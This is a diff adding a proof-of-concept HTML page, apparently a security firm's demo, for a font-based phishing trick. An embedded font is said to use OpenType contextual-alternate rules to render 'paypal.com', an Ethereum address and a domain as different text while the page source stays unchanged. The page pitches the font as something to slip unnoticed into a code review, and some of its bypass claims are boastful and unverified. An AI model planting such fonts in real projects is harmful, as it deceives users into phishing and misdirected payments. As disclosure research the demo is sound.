@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ComfortSans™ — Glyph Substitution Phishing PoC</title>
+<style>
+@font-face {
+  font-family: 'ComfortSans';
+  src: url(data:font/woff2;base64,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) format('woff2');
+  font-weight: normal;
+  font-style: normal;
+}
+:root {
+  --bg: #0a0a0f; --card: #12121a; --border: #1e1e2e;
+  --red: #ff3b3b; --green: #00ff88; --yellow: #ffd93d;
+  --blue: #4dabf7; --text: #e0e0e0; --muted: #666;
+  --font-target: 'ComfortSans', monospace;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', 'Fira Code', monospace; min-height: 100vh; padding: 2rem; }
+.container { max-width: 900px; margin: 0 auto; }
+.header { text-align: center; margin-bottom: 3rem; padding: 2rem; border: 1px solid var(--border); border-radius: 12px; background: linear-gradient(135deg, #12121a 0%, #1a0a0a 100%); }
+.header h1 { font-size: 2rem; background: linear-gradient(90deg, var(--red), var(--yellow)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.5rem; }
+.header .subtitle { color: var(--muted); font-size: 0.85rem; }
+.badge { display: inline-block; padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.7rem; font-weight: bold; text-transform: uppercase; margin: 0.5rem 0.2rem; }
+.badge.red { background: rgba(255,59,59,0.15); color: var(--red); border: 1px solid rgba(255,59,59,0.3); }
+.badge.green { background: rgba(0,255,136,0.15); color: var(--green); border: 1px solid rgba(0,255,136,0.3); }
+.badge.yellow { background: rgba(255,217,61,0.15); color: var(--yellow); border: 1px solid rgba(255,217,61,0.3); }
+.demo-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; }
+.demo-card h2 { font-size: 1rem; color: var(--blue); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.demo-card h2::before { content: '▸'; color: var(--red); }
+.comparison { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+.comparison > div { padding: 1rem; border-radius: 8px; border: 1px solid var(--border); }
+.comparison .dom-view { background: rgba(0,255,136,0.03); border-color: rgba(0,255,136,0.2); }
+.comparison .screen-view { background: rgba(255,59,59,0.03); border-color: rgba(255,59,59,0.2); }
+.label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.4rem; }
+.label.safe { color: var(--green); }
+.label.danger { color: var(--red); }
+.target-text { font-family: var(--font-target); font-size: 1.4rem; padding: 0.5rem 0; word-break: break-all; line-height: 1.6; }
+.mono-text { font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; padding: 0.5rem 0; word-break: break-all; line-height: 1.6; }
+.proof-section { margin-top: 1rem; padding: 1rem; background: rgba(0,0,0,0.3); border-radius: 8px; font-size: 0.8rem; }
+.proof-section code { color: var(--yellow); background: rgba(255,217,61,0.1); padding: 0.1rem 0.3rem; border-radius: 3px; }
+.proof-row { display: flex; justify-content: space-between; padding: 0.3rem 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+.proof-row:last-child { border: none; }
+.proof-row .check { color: var(--green); }
+.try-it { margin-top: 1rem; padding: 0.8rem; background: rgba(255,217,61,0.05); border: 1px dashed rgba(255,217,61,0.3); border-radius: 8px; }
+.try-it textarea { width: 100%; background: rgba(0,0,0,0.4); border: 1px solid var(--border); color: var(--text); font-family: var(--font-target); font-size: 1.2rem; padding: 0.8rem; border-radius: 4px; resize: vertical; min-height: 60px; margin-top: 0.5rem; }
+.clipboard-result { margin-top: 0.5rem; padding: 0.5rem; background: rgba(0,255,136,0.05); border-radius: 4px; font-size: 0.85rem; min-height: 2rem; }
+button { background: rgba(77,171,247,0.15); color: var(--blue); border: 1px solid rgba(77,171,247,0.3); padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; font-family: inherit; font-size: 0.85rem; margin-top: 0.5rem; transition: all 0.2s; }
+button:hover { background: rgba(77,171,247,0.25); }
+.chain { display: flex; gap: 0.3rem; flex-wrap: wrap; margin: 1rem 0; }
+.chain-step { padding: 0.4rem 0.8rem; border-radius: 6px; font-size: 0.75rem; font-weight: bold; }
+.chain-step.pass { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid rgba(0,255,136,0.2); }
+.chain-step.fail { background: rgba(255,59,59,0.1); color: var(--red); border: 1px solid rgba(255,59,59,0.2); }
+.how-it-works { margin-top: 2rem; padding: 1.5rem; background: var(--card); border: 1px solid var(--border); border-radius: 12px; }
+.how-it-works h2 { color: var(--yellow); font-size: 1rem; margin-bottom: 1rem; }
+.how-it-works p { color: var(--muted); font-size: 0.85rem; line-height: 1.6; margin-bottom: 0.8rem; }
+.footer { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid var(--border); color: var(--muted); font-size: 0.75rem; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="header">
+  <h1>☠️ ComfortSans™</h1>
+  <div class="subtitle">"The font that cares about your eyes"</div>
+  <div>
+    
+    
+    <span class="badge green">calt feature — ON by default</span>
+  </div>
+</div>
+
+<!-- DEMO 1: Domain swap -->
+<div class="demo-card">
+  <h2>Domain Phishing — paypal.com → ???</h2>
+  <div class="comparison">
+    <div class="dom-view">
+      <div class="label safe">🔍 DOM / View Source / Copy-Paste</div>
+      <div class="mono-text">paypal.com</div>
+    </div>
+    <div class="screen-view">
+      <div class="label danger">👁️ What You See On Screen</div>
+      <div class="target-text">paypal.com</div>
+    </div>
+  </div>
+  <div class="proof-section">
+    <div class="proof-row"><span>document.querySelector('.target-text').textContent</span><span class="check">→ "paypal.com"</span></div>
+    <div class="proof-row"><span>Copy-paste from right box</span><span>→ Still <code>paypal.com</code></span></div>
+    <div class="proof-row"><span>Ctrl+F "paypal"</span><span class="check">→ Finds it in BOTH boxes</span></div>
+  </div>
+</div>
+
+<!-- DEMO 2: ETH address swap -->
+<div class="demo-card">
+  <h2>Crypto Address Swap — Send ETH to... who?</h2>
+  <div class="comparison">
+    <div class="dom-view">
+      <div class="label safe">🔍 What the code says</div>
+      <div class="mono-text">0x742d35Cc6634C0532925a3b8</div>
+    </div>
+    <div class="screen-view">
+      <div class="label danger">👁️ What your eyes see</div>
+      <div class="target-text">0x742d35Cc6634C0532925a3b8</div>
+    </div>
+  </div>
+  <div class="proof-section">
+    <div class="proof-row"><span>First 10 chars get swapped. Rest stays the same.</span><span class="check">DOM is clean</span></div>
+    <div class="proof-row"><span>Clipboard after Ctrl+C</span><span>→ <code>0x742d35Cc...</code> (victim addr)</span></div>
+  </div>
+</div>
+
+<!-- DEMO 3: bountyy.fi → google.com -->
+<div class="demo-card">
+  <h2>The Flex — bountyy.fi → ???</h2>
+  <div class="comparison">
+    <div class="dom-view">
+      <div class="label safe">🔍 DOM / View Source</div>
+      <div class="mono-text">Visit bountyy.fi for security testing</div>
+    </div>
+    <div class="screen-view">
+      <div class="label danger">👁️ Screen render (ComfortSans)</div>
+      <div class="target-text">Visit bountyy.fi for security testing</div>
+    </div>
+  </div>
+  <div class="proof-section">
+    <div class="proof-row"><span>HTML says <code>bountyy.fi</code></span><span class="check">✓ Legit domain</span></div>
+    <div class="proof-row"><span>Screen shows</span><span style="color:var(--red)">→ something else entirely 😏</span></div>
+    <div class="proof-row"><span>Right-click → Inspect Element</span><span class="check">→ Still <code>bountyy.fi</code></span></div>
+  </div>
+</div>
+
+<!-- TRY IT -->
+<div class="demo-card">
+  <h2>Try It Yourself</h2>
+  <p style="color: var(--muted); font-size: 0.85rem; margin-bottom: 0.5rem;">
+    Type <code style="color:var(--yellow);background:rgba(255,217,61,0.1);padding:0.1rem 0.3rem;border-radius:3px;">paypal.com</code>,
+    <code style="color:var(--yellow);background:rgba(255,217,61,0.1);padding:0.1rem 0.3rem;border-radius:3px;">0x742d35Cc</code>, or
+    <code style="color:var(--yellow);background:rgba(255,217,61,0.1);padding:0.1rem 0.3rem;border-radius:3px;">bountyy.fi</code>
+    in the box below. Watch the font swap it live.
+  </p>
+  <div class="try-it">
+    <div class="label" style="color:var(--yellow);">⌨️ Type here (rendered with ComfortSans)</div>
+    <textarea id="trybox" placeholder="Type paypal.com or bountyy.fi here..."></textarea>
+    <button onclick="checkClipboard()">📋 Read DOM value (what JavaScript sees)</button>
+    <div class="clipboard-result" id="clipboard-result"></div>
+  </div>
+</div>
+
+<!-- BYPASS CHAIN -->
+<div class="demo-card">
+  <h2>What This Bypasses</h2>
+  <div class="chain">
+    <span class="chain-step pass">✓ View Source</span>
+    <span class="chain-step pass">✓ DOM Inspector</span>
+    <span class="chain-step pass">✓ Copy-Paste</span>
+    <span class="chain-step pass">✓ Ctrl+F Search</span>
+    <span class="chain-step pass">✓ Screen Readers</span>
+    <span class="chain-step pass">✓ CSP Headers</span>
+    <span class="chain-step pass">✓ SAST/DAST</span>
+    <span class="chain-step pass">✓ Code Review</span>
+    <span class="chain-step pass">✓ WAF Rules</span>
+    <span class="chain-step pass">✓ SRI Hashes (on HTML)</span>
+    <span class="chain-step fail">✗ Human Eyes</span>
+  </div>
+</div>
+
+<!-- HOW IT WORKS -->
+<div class="how-it-works">
+  <h2>⚙️ How It Works</h2>
+  <p>ComfortSans uses the OpenType <code style="color:var(--yellow)">calt</code> (Contextual Alternates) feature — enabled <strong style="color:var(--red)">by default</strong> in every browser, every OS, and most applications.</p>
+  <p>The font's GSUB table contains Chaining Context Substitution rules. When the shaping engine encounters "paypal.com", "0x742d35Cc", or "bountyy.fi", it substitutes each glyph with an attacker-controlled alternate.</p>
+  <p>Unicode codepoints in the text buffer are <strong>never modified</strong>. Only glyph IDs change during rendering.</p>
+  <p style="color:var(--red); font-weight:bold; margin-top:1rem;">No tool in existence scans font ligature tables for malicious substitutions.</p>
+  <p style="color:var(--muted); margin-top:0.5rem;">Font size: ~1.5KB WOFF2. Looks like any other web font in a PR. The HTML is 100% clean. The binary is the weapon.</p>
+</div>
+
+<div class="footer">
+  <p>ComfortSans™ PoC — Bountyy Oy</p>
+  <p style="margin-top:0.3rem;">The font binary is the weapon. The HTML is innocent. Good luck finding this in a code review.</p>
+</div>
+
+</div>
+<script>
+function checkClipboard() {
+  const val = document.getElementById('trybox').value;
+  document.getElementById('clipboard-result').innerHTML =
+    '<span style="color:var(--green)">DOM value:</span> <code style="color:var(--yellow)">' +
+    val.replace(/</g,'&lt;') + '</code><br>' +
+    '<span style="color:var(--muted)">↑ This is what JS/copy-paste sees. Your eyes saw something different.</span>';
+}
+document.getElementById('trybox').addEventListener('input', checkClipboard);
+</script>
+</body>
+</html>
